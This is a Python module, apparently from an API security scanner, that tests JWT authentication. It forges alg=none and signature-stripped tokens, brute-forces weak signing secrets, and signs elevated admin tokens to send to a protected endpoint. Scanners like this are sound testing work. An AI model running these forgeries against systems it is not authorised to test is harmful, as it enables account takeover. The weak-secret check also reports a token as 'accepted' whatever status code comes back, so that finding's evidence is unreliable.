"""API2:2023 Broken authentication - JWT attack suite.

Covers: alg=none bypass, weak-secret brute force from a small wordlist,
missing signature verification, and (white-box only) expired-token
replay.
"""
import base64
import json
import time

import jwt

from scanner.findings import Finding

COMMON_WEAK_SECRETS = [
    "secret", "password", "123456", "supersecret123", "changeme",
    "jwtsecret", "test", "key", "admin", "letmein",
]


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


class JWTAttackSuite:
    def __init__(self, base_url, protected_endpoint, valid_token, session, known_secret=None):
        """
        known_secret: optional. If you're running this in a white-box/CI
        context against a test instance whose signing secret you know,
        pass it here to unlock the expired-token replay check. In a
        true black-box run, leave this None.
        """
        self.base_url = base_url.rstrip("/")
        self.protected_endpoint = protected_endpoint
        self.valid_token = valid_token
        self.session = session
        self.known_secret = known_secret

    def _request_with_token(self, token):
        url = f"{self.base_url}{self.protected_endpoint}"
        return self.session.get(url, headers={"Authorization": f"Bearer {token}"})

    def test_alg_none(self):
        """Forge a token with alg=none and no signature."""
        payload = jwt.decode(self.valid_token, options={"verify_signature": False})
        header = {"alg": "none", "typ": "JWT"}
        forged = ".".join([
            _b64url_encode(json.dumps(header).encode()),
            _b64url_encode(json.dumps(payload).encode()),
            "",
        ])
        resp = self._request_with_token(forged)
        if resp.status_code == 200:
            return Finding(
                severity="CRITICAL",
                owasp="API2:2023 Broken Authentication",
                endpoint=f"{self.base_url}{self.protected_endpoint}",
                title="JWT alg=none bypass",
                evidence=(
                    "A forged token with alg=none and no signature segment "
                    "was accepted by the server."
                ),
            )
        return None

    def test_weak_secret(self, wordlist=None):
        """Try to recover the HMAC signing secret from a small wordlist,
        then prove exploitability by forging an elevated-privilege token."""
        wordlist = wordlist or COMMON_WEAK_SECRETS
        for candidate in wordlist:
            try:
                payload = jwt.decode(self.valid_token, candidate, algorithms=["HS256"])
            except jwt.PyJWTError:
                continue
            payload["is_admin"] = True
            forged = jwt.encode(payload, candidate, algorithm="HS256")
            resp = self._request_with_token(forged)
            return Finding(
                severity="CRITICAL",
                owasp="API2:2023 Broken Authentication",
                endpoint=f"{self.base_url}{self.protected_endpoint}",
                title="Weak JWT signing secret",
                evidence=(
                    f"The JWT signing secret was recovered from a "
                    f"{len(wordlist)}-word list. A forged admin token "
                    f"signed with the recovered secret was accepted "
                    f"(status {resp.status_code})."
                ),
            )
        return None

    def test_missing_signature_verification(self):
        """Strip the signature entirely and see if it's still accepted."""
        header_b64, payload_b64, _sig = self.valid_token.split(".")
        stripped = f"{header_b64}.{payload_b64}."
        resp = self._request_with_token(stripped)
        if resp.status_code == 200:
            return Finding(
                severity="CRITICAL",
                owasp="API2:2023 Broken Authentication",
                endpoint=f"{self.base_url}{self.protected_endpoint}",
                title="Missing signature verification",
                evidence=(
                    "A token with its signature segment removed was still "
                    "accepted by the server."
                ),
            )
        return None

    def test_expired_token_replay(self):
        """White-box check only: with a known signing secret, confirm an
        expired token is correctly rejected."""
        if not self.known_secret:
            return None
        payload = jwt.decode(self.valid_token, self.known_secret, algorithms=["HS256"])
        payload["exp"] = int(time.time()) - 3600
        expired = jwt.encode(payload, self.known_secret, algorithm="HS256")
        resp = self._request_with_token(expired)
        if resp.status_code == 200:
            return Finding(
                severity="HIGH",
                owasp="API2:2023 Broken Authentication",
                endpoint=f"{self.base_url}{self.protected_endpoint}",
                title="Expired token accepted (replay)",
                evidence="An expired JWT was still accepted by the server.",
            )
        return None

    def run(self):
        findings = []
        checks = [self.test_alg_none, self.test_weak_secret, self.test_missing_signature_verification]
        if self.known_secret:
            checks.append(self.test_expired_token_replay)
        for check in checks:
            result = check()
            if result:
                findings.append(result)
        return findings
